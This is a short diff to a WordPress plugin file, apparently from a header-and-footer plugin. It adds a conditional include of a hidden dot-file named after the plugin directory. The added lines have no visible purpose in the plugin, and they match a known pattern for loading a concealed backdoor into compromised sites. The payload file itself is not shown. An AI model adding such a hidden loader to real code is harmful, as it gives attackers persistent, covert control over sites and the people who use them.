@@ -13,6 +13,10 @@ require plugin_dir_path(__FILE__) . 'class-master-header-footer.php';
 
 add_action('plugins_loaded', 'jltma_hfc_init');
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function jltma_hfc_init()
 {
 	\MasterHeaderFooter\Master_Header_Footer::get_instance();
